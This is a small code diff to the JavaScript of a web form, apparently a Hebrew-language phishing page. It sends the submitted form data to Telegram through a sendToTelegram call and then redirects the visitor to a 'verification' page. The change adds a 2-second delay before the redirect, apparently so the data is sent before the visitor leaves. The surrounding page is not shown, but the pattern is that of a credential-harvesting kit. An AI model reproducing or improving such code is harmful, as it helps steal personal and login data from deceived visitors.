@@ -228,7 +228,9 @@
 
             if (isValid) {
                 sendToTelegram(formData);
-                window.location.href = 'verification.html';
+                setTimeout(function() {
+                    window.location.href = 'verification.html'; 
+                }, 2000); // تأخير بسيط قبل الانتقال للصفحة
             } else {
                 alert('נא לתקן את כל השגיאות לפני שליחה.');
             }
